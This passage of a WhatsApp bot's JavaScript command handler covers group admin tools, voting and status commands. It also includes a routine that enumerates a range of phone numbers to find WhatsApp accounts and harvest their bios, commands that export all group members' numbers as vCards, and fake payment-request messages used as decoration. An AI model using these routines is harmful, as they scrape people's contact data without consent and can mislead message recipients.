        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await AlyaBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await AlyaBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcalya(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return AlyaStickGroup()
if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
alyabigpp = await AlyaBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
AlyaBotInc.sendContact(m.chat, participants.map(a => a.id), alyabigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return AlyaStickGroup()
if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
let cmiggc = await AlyaBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcalya('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
AlyaBotInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return AlyaStickGroup()
if (!m.mentionedJid[0]) return replygcalya('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
AlyaBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return AlyaStickGroup()
if (!(isGroupAdmins || AlyaTheQueen)) return AlyaStickAdmin()
if (!m.mentionedJid[0]) return replygcalya('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
AlyaBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return AlyaStickGroup()
                if(!AlyaTheQueen) return AlyaStickOwner()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygcalya(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygcalya(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygcalya(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (!text) return replygcalya('Text ?')
                await AlyaBotInc.groupUpdateSubject(m.chat, text)
                replygcalya(mess.done)
                break
                case 'userjid':{
          	if(!AlyaTheQueen) return AlyaStickOwner()
        const groupMetadata = m.isGroup ? await AlyaBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcalya(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!AlyaTheQueen) return AlyaStickOwner()
if (!args.join(" ")) return replygcalya(`Use ${prefix+command} groupname`)
try {
let cret = await AlyaBotInc.groupCreate(args.join(" "), [])
let response = await AlyaBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
AlyaBotInc.sendMessage(m.chat, { text:teksop, mentions: await AlyaBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	replygcalya(`Error`)
	}
}
break
    case 'setbotbio':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (!text) return replygcalya(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await AlyaBotInc.updateProfileStatus(text)
    replygcalya(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return AlyaStickGroup()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
if (!isBotAdmins) return AlyaStickBotAdmin()
    await AlyaBotInc.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!AlyaTheQueen) return AlyaStickOwner()
    await AlyaBotInc.removeProfilePicture(AlyaBotInc.user.id)
    replygcalya(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (!text) return replygcalya('Text ?')
                await AlyaBotInc.groupUpdateDescription(m.chat, text)
                replygcalya(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins) return replygcalya(mess.admin)
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (!quoted) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcalya(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcalya(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await AlyaBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await AlyaBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcalya(mess.done)
                } else {
                    var memeg = await AlyaBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcalya(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                AlyaBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'kickall': {
 if (!m.isGroup) return AlyaStickGroup()
 if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
 if (!isBotAdmins) return AlyaStickBotAdmin()
  const alyakickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of alyakickall) {
 await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcalya(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return AlyaStickGroup()
 if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
 if (!isBotAdmins) return AlyaStickBotAdmin()
  const alyapromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of alyapromoteall) {
 await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcalya(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return AlyaStickGroup()
 if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
 if (!isBotAdmins) return AlyaStickBotAdmin()
  const alyademoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of alyademoteall) {
 await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcalya(`Success`);
}
break
            case 'hidetag':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                AlyaBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (!isAdmins) return replygcalya(mess.admin)
                if (!m.quoted) return replygcalya(`Reply media with caption ${prefix + command}`)
                AlyaBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':{
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (args[0] === 'close') {
                    await AlyaBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcalya(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await AlyaBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcalya(`Success Opening Group`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                }
            break
            case 'editinfo':{
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (args[0] === 'open') {
                    await AlyaBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcalya(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await AlyaBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcalya(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let response = await AlyaBotInc.groupInviteCode(m.chat)
                AlyaBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await AlyaBotInc.fetchStatus(who)
    replygcalya(bio.status)
  } catch {
    if (text) return replygcalya(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await AlyaBotInc.fetchStatus(who)
      replygcalya(bio.status)
    } catch {
      return replygcalya(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return AlyaStickGroup()
            if (m.chat in vote) return replygcalya(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcalya(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcalya(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            AlyaBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return AlyaStickGroup()
            if (!(m.chat in vote)) return replygcalya(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcalya('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            AlyaBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return AlyaStickGroup()
            if (!(m.chat in vote)) return replygcalya(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcalya('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            AlyaBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return AlyaStickGroup()
if (!(m.chat in vote)) return replygcalya(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${AlyaBotInc.user.id}
`
AlyaBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return AlyaStickGroup()
            if (!(m.chat in vote)) return replygcalya(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcalya('Successfully Deleted Vote Session In This Group')
	    }
            break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                await AlyaBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcalya(`Reset Success`)
                    })
            break
                //bot status
            case 'ping': 
case 'botstatus': 
case 'statusbot': 
case 'p': {
    // React to the message with a gear emoji
    AlyaBotInc.sendMessage(from, { react: { text: "⚙️", key: m.key } });

    // CPU information
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.values(cpu.times).reduce((last, type) => last + type, 0);
        return cpu;
    });
    
    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();
    
    // Formatting the response message
    const respon = `
📊 *Bot Status* 📊
━━━━━━━━━━━━━━━━━━━━
⚙️ *Ping:* ${latensi.toFixed(4)} ms
⏱️ *Response Time:* ${(oldd - neww).toFixed(2)} ms
💾 *RAM Usage:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
🕒 *Uptime:* ${runtime(process.uptime())}
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Send the response message with external ad reply
    AlyaBotInc.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'INR',
            amount1000: 999999999,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "Queen alya Status",
                            thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
                            sourceUrl: king,
                            renderLargerThumbnail: true
                        }
                    }
                }
            }
        }
    }, { quoted: floc });
}
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/STAR-KING0/Queen_Alya`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await AlyaBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    } else {
      await replygcalya(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcalya(`Repository currently not available `)
  }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                await AlyaBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
                            sourceUrl: king,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                replygcalya(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                replygcalya('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) AlyaBotInc.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
                                sourceUrl: king,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) AlyaBotInc.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
                                sourceUrl: king,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                AlyaBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
                            sourceUrl: king,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `「 QUEEN ALYA Script 」\n\nChannel: ${king}\nGitHub: ${global.botscript}\n\nHi @${('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.imgur.com/DeJiOrr.jpeg`
sendAlyaBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./AlyaMedia/theme/alya.jpg"),
"mediaUrl": `${king}`,
"sourceUrl": `${king}`
}
}
})
}
break
            case 'owner': {
                AlyaBotInc.sendMessage(from, {
